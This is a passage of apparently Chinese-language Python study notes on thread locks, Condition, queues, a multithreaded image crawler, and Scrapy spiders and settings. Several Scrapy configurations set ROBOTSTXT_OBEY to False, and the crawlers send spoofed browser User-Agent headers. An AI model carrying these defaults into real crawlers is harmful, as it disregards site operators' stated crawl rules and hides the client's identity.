gLock.acquire()\n                if gTimes &gt;= gTotalTimes:\n                    gLock.release()\n                    break\n                gMoney += money\n                print(&#39;&#123;&#125;生产了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;\n                      .format(threading.current_thread(), money, gMoney))\n                gTimes += 1\n                gLock.release()\n                time.sleep(0.5)\n\n\n    # 消费线程Consumer\n    class Consumer(threading.Thread):\n        def run(self):\n            global gMoney\n            while True:\n                money = random.randint(100, 1000)\n                gLock.acquire()\n                if gMoney &gt;= money:\n                    gMoney -= money\n                    print(&#39;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#39;\n                          .format(threading.current_thread(), money, gMoney))\n                # 若剩余金额不足以消费，则退出循环\n                else:\n                    if gTimes &gt;= gTotalTimes:\n                        gLock.release()\n                        break\n                    print(&#39;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#39;\n                          .format(threading.current_thread(), money, gMoney))\n                gLock.release()\n                time.sleep(0.5)\n\n\n    def mainIt():\n        # 设置3个消费线程\n        for x in range(3):\n            t = Consumer(name=&#39;消费者线程&#123;&#125;&#39;.format(x))\n            t.start()\n            # 设置5个生产线程\n\n        for x in range(5):\n            t = Producer(name=&#39;生产者线程&#123;&#125;&#39;.format(x))\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        mainIt()\n</code></pre>\n<ul>\n<li>代码示例二：(condition版)</li>\n</ul>\n<pre><code class=\"python\">\n    import threading\n    import random\n    import time\n\n    gMoney = 1000\n    gCondition = threading.Condition()  # 等同于threading.Lock\n    gTimes = 0\n    gTotalTimes = 5\n\n\n    class Producer(threading.Thread):\n        def run(self):\n            global gMoney\n            global gCondition\n            global gTimes\n            while True:\n                money = random.randint(100, 1000)\n                gCondition.acquire()  # 加锁（全局变量改变前（gMoney））\n                if gTimes &gt;= gTotalTimes:\n                    gCondition.release()  # 解锁\n                    print(&quot;当前生产者总共生产了%s次&quot; % gTimes)\n                    break\n                gMoney += money\n                print(&quot;%s当前存入%s元钱，剩余%s元线&quot; % (threading.current_thread(), money, gMoney))\n                gTimes += 1\n                gCondition.notify_all()  # 通知正在等待的线程（wait）\n                gCondition.release()\n                time.sleep(0.5)\n\n\n    class Cosumer(threading.Thread):\n        def run(self):\n            global gMoney\n            while True:\n                money = random.randint(100, 1000)\n                gCondition.acquire()\n                while gMoney &lt; money:\n                    if gTimes &gt;= gTotalTimes:\n                        gCondition.release()\n                        return\n                    print(&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot; % (threading.current_thread(), money, gMoney))\n                    gCondition.wait()  # 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）\n                gMoney -= money\n                print(&quot;%s消费了%d元钱，剩余%d元钱&quot; % (threading.current_thread(), money, gMoney))\n                gCondition.release()\n                time.sleep(0.5)\n\n\n    def main():\n        for x in range(3):\n            t = Cosumer(name=&quot;消费者线程%s&quot; % x)\n            t.start()\n        for y in range(5):\n            t1 = Producer(name=&quot;生产者线程%s&quot; % y)\n            t1.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程Lock与condition方法总结：<ol>\n<li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li>\n<li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li>\n</ul>\n<ol>\n<li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p>\n</li>\n<li><p>Queue.qsize()   返回队列的大小</p>\n</li>\n<li><p>Queue.empty()   如果队列为空，返回True,反之False</p>\n</li>\n<li><p>Queue.full()   如果队列满了，返回True,反之False</p>\n</li>\n<li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p>\n</li>\n<li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p>\n</li>\n<li><p>Queue.queue.clear()   清空队列</p>\n</li>\n<li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p>\n</li>\n<li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p>\n</li>\n<li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p>\n</li>\n<li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p>\n</li>\n</ol>\n<pre><code class=\"python\">    from queue import Queue\n    import time\n    import threading\n\n\n    # 在队列中放入数值\n    def set_value(q):\n        index = 0\n        while True:\n            q.put(index)\n            index += 1\n            time.sleep(0.8)\n\n\n    # 取出队列中的数值\n    def get_value(q):\n        while True:\n            print(q.get())\n\n\n    def main():\n        # 产生一个队列\n        q = Queue(1)\n        t1 = threading.Thread(target=set_value, args=[q])\n        t2 = threading.Thread(target=get_value, args=[q])\n\n        t1.start()\n        t2.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>生产者与消费者模型</li>\n</ul>\n<ul>\n<li>代码示例三：(Queue版)</li>\n</ul>\n<pre><code class=\"python\">    import threading,time\n    #python2  from Queue import Queue\n    #python3\n    import queue\n\n    class Producer(threading.Thread):\n        def run(self):\n            global queue\n            count = 0\n            while True:\n                #qsize返回queue内部长度\n                if queue.qsize() &lt; 1000:\n                    for i in range(100):\n                        count += 1\n                        msg = &#39;生成产量&#39;+str(count)\n                        #put是往queue中放入\n                        queue.put(msg)\n                        print(msg)\n                time.sleep(0.5)\n    class Consumer(threading.Thread):\n        def run(self):\n            global queue\n            while True:\n                if queue.qsize() &gt; 100:\n                    for i in range(3):\n                        #get从queue中取出一个值\n                        msg = self.name + &quot;消费了&quot;+queue.get()\n                        print(msg)\n                time.sleep(1)\n    if __name__ == &#39;__main__&#39;:\n        queue = queue.Queue()\n        for i in range(500):\n            queue.put(&quot;初始产品&quot;+str(i))\n        for i in range(2):\n            p = Producer()\n            p.start()\n        for i in range(5):\n            c = Consumer()\n            c.start()\n</code></pre>\n<h3 id=\"爬虫之多线程\"><a href=\"#爬虫之多线程\" class=\"headerlink\" title=\"爬虫之多线程\"></a>爬虫之多线程</h3><ul>\n<li>多线程爬虫框架代码</li>\n</ul>\n<pre><code class=\"python\">    import requests\n    from lxml import etree\n    import os\n    import re\n    from queue import Queue\n    import threading\n\n    &quot;&quot;&quot; \n    我们引入了threading这个包，我们将使用这个包中的\n    Thread类，并在我们自定义的类中继承这个Thread类\n    &quot;&quot;&quot;\n\n\n    # 生产者线程\n    class Procuder(threading.Thread):\n        headers = &#123;\n                &#39;User-Agent&#39;: &#39;... 浏览器...&#39;\n        &#125;\n\n        &quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;\n        &quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;\n        def __init__(self, page_queue, img_queue, *args, **kwargs):\n            super(Procuder, self).__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n\n        &quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;\n        &quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中\n            获取每页的url\n        &quot;&quot;&quot;\n        def run(self):\n            while True:\n                if self.page_queue.empty():\n                    break\n                url = self.page_queue.get()\n                self.parse_page(url)\n\n        def parse_page(self, url):\n            &quot;&quot;&quot; \n            .......\n\n            获取每页的响应数据，并从中提取出每张图片的\n            url和name，并放入队列中\n            &quot;&quot;&quot;\n\n\n    # 消费者线程\n    class Consumer(threading.Thread):\n        def __init__(self, page_queue, img_queue, *args, **kwargs):\n            super(Procuder, self).__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n\n        def run(self):\n            while True:\n                if self.img_queue.empty() and self.page_queue.empty():\n                    break\n                    &quot;&quot;&quot;\n                    ......\n\n                    利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存\n                    &quot;&quot;&quot;\n\n    def main():\n        &quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;\n        page_queue = Queue()\n        img_queue = Queue()\n\n        # 将每页的url放到页数队列中\n        for x in range(1, 101):\n            url = &#39;http://........ %d&#39; % x\n            page_queue.put(url)\n\n        # 设置5个生产者线程\n        for x in range(5):\n            t = Procuder(page_queue, img_queue)\n            t.start()\n\n        # 设置5个消费者线程\n        for x in range(5):\n            t = Consumer(page_queue, img_queue)\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程爬虫实战代码</li>\n</ul>\n<pre><code class=\"python\">    import requests\n    import re\n    from lxml import etree\n    import threading\n    import os\n    import queue\n    from urllib import request\n\n    # 生产图片的url和name\n    class ProimgUrl(threading.Thread):\n        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n            self.headers = headers\n\n        def run(self):\n            while True:\n                if self.page_queue.empty():\n                    break\n                else:\n                    url = self.page_queue.get()\n                    self.parse_page(url)\n\n        def parse_page(self, url):\n            img_get = requests.get(url=url, headers=self.headers).text\n            tree = etree.HTML(img_get)\n            img_it = tree.xpath(&#39;//div[@class=&quot;page-content text-center&quot;]//a&#39;)\n            for it in img_it:\n                img_url = it.xpath(&#39;./img[@class!=&quot;gif&quot;]/@data-original&#39;)[0]\n                alt = it.xpath(&#39;./img/@alt&#39;)[0]\n                alt = re.sub(r&#39;[\\?？.!！，。\\/\\*]&#39;, &#39;&#39;, alt)\n                # 利用splitext截取图片的后缀名\n                suffix = os.path.splitext(img_url)[1]\n                img_name = alt + suffix\n                self.img_queue.put((img_url, img_name))\n\n\n    # 获取图片并储存\n    class ConimgName(threading.Thread):\n        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n            self.page_queue = page_queue\n            self.img_queue = img_queue\n            self.headers = headers\n\n        def run(self):\n            while True:\n                if self.img_queue.empty() and self.page_queue.empty():\n                    break\n                else:\n                    img_url, img_name = self.img_queue.get()\n                    # 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片\n                    request.urlretrieve(img_url, &#39;./smile/&#39;+img_name)\n                    print(img_name + &#39; 下载成功...&#39;)\n\n    def main():\n        if not os.path.exists(&#39;./smile&#39;):\n            os.mkdir(&#39;./smile&#39;)\n        headers = &#123;\n            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                          &#39;Chrome/80.0.3987.149 Safari/537.36 &#39;\n        &#125;\n        page_queue = queue.Queue(100)\n        img_queue = queue.Queue(1000)\n\n        for x in range(1, 10):\n            url = &#39;https://www.doutula.com/photo/list/?page=&#39; + str(x)\n            page_queue.put(url)\n\n        for i in range(5):\n            t = ProimgUrl(page_queue, img_queue, headers)\n            t.start()\n\n        for i in range(5):\n            t = ConimgName(page_queue, img_queue, headers)\n            t.start()\n\n\n    if __name__ == &#39;__main__&#39;:\n        main()\n</code></pre>\n<ul>\n<li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li>\n</ul>\n<h1 id=\"爬虫第五天\"><a href=\"#爬虫第五天\" class=\"headerlink\" title=\"爬虫第五天\"></a>爬虫第五天</h1><h2 id=\"scrapy爬虫框架\"><a href=\"#scrapy爬虫框架\" class=\"headerlink\" title=\"scrapy爬虫框架\"></a>scrapy爬虫框架</h2><p><a href=\"https://zhuanlan.zhihu.com/p/25443389\">关于xpath选择器selector的网址</a></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200328091921480.png\" alt=\"scrapy框架示意图\"></p>\n<ol>\n<li><p>创建项目</p>\n<p>​    scrapy startproject #^%#^(项目名字)</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p>创建爬虫</p>\n<p>​    scrapy genspider 爬虫名字 网络域名</p>\n<p>注意：</p>\n<ul>\n<li>爬虫名字不要和项目名字一样</li>\n<li>网站域名是允许爬虫采集的域名<ul>\n<li>baidu.com</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><img src=\"https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\" alt=\"创建项目与配置环境后各部分组件\"></p>\n<p>item文件是存储数据的</p>\n<ul>\n<li><p>在setting文件（程序启动被首先检查的文件）</p>\n</li>\n<li><p>BOT_NAME = 爬虫的名字</p>\n</li>\n<li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p>\n</li>\n<li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p>\n</li>\n<li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p>\n</li>\n<li><p>COOKLES_ENABLED = cookiede的使用，布尔</p>\n</li>\n<li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p>\n</li>\n<li><p>ITEM_PIPELINES = 管道文件</p>\n</li>\n</ul>\n<h3 id=\"setting文件详解\"><a href=\"#setting文件详解\" class=\"headerlink\" title=\"setting文件详解\"></a>setting文件详解</h3><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n\n  # Scrapy settings for TestSpider project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  BOT_NAME = &#39;TestSpider&#39;\n\n  SPIDER_MODULES = [&#39;TestSpider.spiders&#39;]\n  NEWSPIDER_MODULE = &#39;TestSpider.spiders&#39;\n\n\n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  #USER_AGENT = &#39;TestSpider (+http://www.yourdomain.com)&#39;\n\n  USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#39;\n\n  # Obey robots.txt rules\n  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。\n  # 默认是True，设置为False不遵守这个协议。\n  ROBOTSTXT_OBEY = False\n\n\n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # 配置scrapy的请求连接数，默认会同时并发16个请求。\n  # CONCURRENT_REQUESTS = 10\n\n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n\n  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0\n  # DOWNLOAD_DELAY = 3\n\n\n  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。\n  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n\n\n  # Disable cookies (enabled by default)\n  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。\n  # COOKIES_ENABLED = False\n\n  # Disable Telnet Console (enabled by default)\n  #TELNETCONSOLE_ENABLED = False\n\n\n  # Override the default request headers:\n\n  # 配置默认的请求头Headers.\n  # DEFAULT_REQUEST_HEADERS = &#123;\n  #   &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n  #   &#39;Accept-Language&#39;: &#39;en&#39;,\n  # &#125;\n\n\n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。\n  # SPIDER_MIDDLEWARES = &#123;\n  #    &#39;TestSpider.middlewares.TestspiderSpiderMiddleware&#39;: 543,\n  # &#125;\n\n\n  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = &#123;\n  #    &#39;TestSpider.middlewares.TestspiderDownloaderMiddleware&#39;: 543,\n  # &#125;\n\n\n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = &#123;\n  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n  # &#125;\n\n\n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n\n  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。\n  # ITEM_PIPELINES = &#123;\n  #    &#39;TestSpider.pipelines.TestspiderPipeline&#39;: 300,\n  # &#125;\n\n\n  # 限速配置\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n\n  # 是否开启自动限速\n  # AUTOTHROTTLE_ENABLED = True\n\n\n  # The initial download delay\n  # 配置初始url的下载延时\n  # AUTOTHROTTLE_START_DELAY = 5\n\n\n  # The maximum download delay to be set in case of high latencies\n  # 配置最大请求时间\n  # AUTOTHROTTLE_MAX_DELAY = 60\n\n\n  # 配置请求和请求之间的下载间隔，单位是秒\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n\n\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n\n\n  # 关于Http缓存的配置，默认是不启用。\n  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  #HTTPCACHE_ENABLED = True\n  #HTTPCACHE_EXPIRATION_SECS = 0\n  #HTTPCACHE_DIR = &#39;httpcache&#39;\n  #HTTPCACHE_IGNORE_HTTP_CODES = []\n  #HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;</code></pre>\n<h3 id=\"scrapy爬虫之spider类（示例-一：爬取糗事百科）\"><a href=\"#scrapy爬虫之spider类（示例-一：爬取糗事百科）\" class=\"headerlink\" title=\"scrapy爬虫之spider类（示例 一：爬取糗事百科）\"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul>\n<li><p>创建爬虫项目：scrapy startproject xiushi</p>\n</li>\n<li><p>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</p>\n<h4 id=\"item-部分\"><a href=\"#item-部分\" class=\"headerlink\" title=\"item 部分\"></a>item 部分</h4><pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n</code></pre>\n</li>\n</ul>\n<p>  class XiushiItem(scrapy.Item):<br>      # define the fields for your item here like:<br>      # name = scrapy.Field()<br>      title = scrapy.Field()<br>      text = scrapy.Field()</p>\n<pre><code>\n  #### setting 部分\n\n  ```python\n  # -*- coding: utf-8 -*-\n\n  # Scrapy settings for xiushi project\n  #\n  # For simplicity, this file contains only settings considered important or\n  # commonly used. You can find more settings consulting the documentation:\n  #\n  #     https://doc.scrapy.org/en/latest/topics/settings.html\n  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\n  BOT_NAME = &#39;xiushi&#39;\n\n  SPIDER_MODULES = [&#39;xiushi.spiders&#39;]\n  NEWSPIDER_MODULE = &#39;xiushi.spiders&#39;\n\n  # Crawl responsibly by identifying yourself (and your website) on the user-agent\n  # USER_AGENT = &#39;xiushi (+http://www.yourdomain.com)&#39;\n\n  # Obey robots.txt rules\n  ROBOTSTXT_OBEY = False\n\n  # Configure maximum concurrent requests performed by Scrapy (default: 16)\n  # CONCURRENT_REQUESTS = 32\n\n  # Configure a delay for requests for the same website (default: 0)\n  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay\n  # See also autothrottle settings and docs\n  DOWNLOAD_DELAY = 1\n  # The download delay setting will honor only one of:\n  # CONCURRENT_REQUESTS_PER_DOMAIN = 16\n  # CONCURRENT_REQUESTS_PER_IP = 16\n\n  # Disable cookies (enabled by default)\n  # COOKIES_ENABLED = False\n\n  # Disable Telnet Console (enabled by default)\n  # TELNETCONSOLE_ENABLED = False\n\n  # Override the default request headers:\n  DEFAULT_REQUEST_HEADERS = &#123;\n      &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,\n      &#39;Accept-Language&#39;: &#39;en&#39;,\n      &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;\n                    &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;\n  &#125;\n\n  # Enable or disable spider middlewares\n  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n  # SPIDER_MIDDLEWARES = &#123;\n  #    &#39;xiushi.middlewares.XiushiSpiderMiddleware&#39;: 543,\n  # &#125;\n\n  # Enable or disable downloader middlewares\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n  # DOWNLOADER_MIDDLEWARES = &#123;\n  #    &#39;xiushi.middlewares.XiushiDownloaderMiddleware&#39;: 543,\n  # &#125;\n\n  # Enable or disable extensions\n  # See https://doc.scrapy.org/en/latest/topics/extensions.html\n  # EXTENSIONS = &#123;\n  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,\n  # &#125;\n\n  # Configure item pipelines\n  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  ITEM_PIPELINES = &#123;\n     &#39;xiushi.pipelines.XiushiPipeline&#39;: 300,\n  &#125;\n\n  # Enable and configure the AutoThrottle extension (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html\n  # AUTOTHROTTLE_ENABLED = True\n  # The initial download delay\n  # AUTOTHROTTLE_START_DELAY = 5\n  # The maximum download delay to be set in case of high latencies\n  # AUTOTHROTTLE_MAX_DELAY = 60\n  # The average number of requests Scrapy should be sending in parallel to\n  # each remote server\n  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0\n  # Enable showing throttling stats for every response received:\n  # AUTOTHROTTLE_DEBUG = False\n\n  # Enable and configure HTTP caching (disabled by default)\n  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings\n  # HTTPCACHE_ENABLED = True\n  # HTTPCACHE_EXPIRATION_SECS = 0\n  # HTTPCACHE_DIR = &#39;httpcache&#39;\n  # HTTPCACHE_IGNORE_HTTP_CODES = []\n  # HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;\n</code></pre><h4 id=\"spider-部分\"><a href=\"#spider-部分\" class=\"headerlink\" title=\"spider 部分\"></a>spider 部分</h4><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n  import scrapy\n  from xiushi.items import XiushiItem\n\n\n  class XiushispiderSpider(scrapy.Spider):\n      name = &#39;xiushiSpider&#39;\n      allowed_domains = [&#39;qiushidabaike.com&#39;]\n      start_urls = [&#39;http://qiushidabaike.com/index_1.html&#39;]\n      base_domain = &#39;http://qiushidabaike.com&#39;\n\n      def parse(self, response):\n          duanzi = response.xpath(&#39;//div[@class=&quot;main-left fl&quot;]//dl&#39;)\n          for it in duanzi:\n              title = it.xpath(&#39;./dt/span/a/text()&#39;).get().strip()\n              text = it.xpath(&#39;./dd[@class=&quot;content&quot;]//text()&#39;).getall()\n              text = &quot;&quot;.join(text).strip()\n              item = XiushiItem(title=title, text=text)\n              yield item\n          # 进行翻页操作\n          next_url = response.xpath(&#39;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#39;).get()\n          if not next_url:\n              return\n          else:\n              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)\n</code></pre>\n<h4 id=\"pipelines-部分\"><a href=\"#pipelines-部分\" class=\"headerlink\" title=\"pipelines 部分\"></a>pipelines 部分</h4><pre><code class=\"python\">  # -*- coding: utf-8 -*-\n\n  # Define your item pipelines here\n  #\n  # Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting\n  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html\n  &quot;&quot;&quot;\n  # 第一种方法，没进行json优化，但是看起来简单易操作\n  import json\n\n\n  class XiushiPipeline(object):\n      def __init__(self):\n          self.fp = open(&#39;duanzi.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)\n\n      def open_spider(self, spider):\n          print(&#39;爬虫开始了...&#39;)\n\n      def process_item(self, item, spider):\n          item_json = json.dumps(dict(item),  ensure_ascii=False)\n          self.fp.write(item_json+&#39;\\n&#39;)\n          return item\n\n      def close_spider(self, spider):\n          self.fp.close()\n          print(&quot;爬虫结束了...&quot;)\n  &quot;&quot;&quot;\n  # 方案二，json优化，结果是每个字典存储在列表中\n  #        好处是满足json规则，坏处是数据量较大时比较耗内存\n  # &#39;&#39;&#39; 自我感觉这种方法不咋地 &#39;&#39;&#39;\n  # from scrapy.exporters import JsonItemExporter\n  #\n  #\n  # class XiushiPipeline(object):\n  #     def __init__(self):\n  #         # 注意此时以二进制形式写入\n  #         self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)\n  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)\n  #         self.exporter.start_exporting()\n  #\n  #     def open_spider(self, spider):\n  #         print(&#39;爬虫开始了...&#39;)\n  #\n  #     def process_item(self, item, spider):\n  #         self.exporter.export_item(item)\n  #         return item\n  #\n  #     def close_spider(self, spider):\n  #         self.exporter.finish_exporting()\n  #         self.fp.close()\n  #         print(&quot;爬虫结束了...&quot;)\n\n  &#39;&#39;&#39;方案三&#39;&#39;&#39;\n  from scrapy.exporters import JsonLinesItemExporter\n\n\n  class XiushiPipeline(object):\n      def __init__(self):\n          # 注意此时以二进制形式写入\n          self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)\n          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)\n\n      def open_spider(self, spider):\n          print(&#39;爬虫开始了...&#39;)\n\n      def process_item(self, item, spider):\n          self.exporter.export_item(item)\n          return item\n\n      def close_spider(self, spider):\n          self.fp.close()\n          print(&quot;爬虫结束了...&quot;)\n</code></pre>\n<ul>\n<li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li>\n</ul>\n<pre><code class=\"python\">from scrapy import cmdline\n\ncmdline.execute(&quot;scrapy crawl xiushiSpider&quot;.split())\n# cmdline.execute([&quot;scrapy&quot;, &#39;crawl&#39;, &#39;xiushiSpider&#39;])</code></pre>\n<h1 id=\"爬虫第六天\"><a href=\"#爬虫第六天\" class=\"headerlink\" title=\"爬虫第六天\"></a>爬虫第六天</h1><h3 id=\"scrapy-框架之spider类（示例二-爬取优美散文）\"><a href=\"#scrapy-框架之spider类（示例二-爬取优美散文）\" class=\"headerlink\" title=\"scrapy 框架之spider类（示例二.爬取优美散文）\"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul>\n<li>item部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass ProseItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()\n</code></pre>\n<ul>\n<li>settings部分</li>\n</ul>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\n\n# Scrapy settings for prose project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     https://doc.scrapy.org/en/latest/topics/settings.html\n#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html\n#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = &#39;prose&#39;\n\nSPIDER_MODULES = [&#39;prose.spiders&#39;]\nNEWSPIDER_MODULE = &#39;prose.spiders&#39;\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n# USER_AGENT = &#39;prose (+http://www.yourdomain.com)&#39;\n\n# Obey robots.txt rules\nROBOTSTXT_OBEY = False\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n# 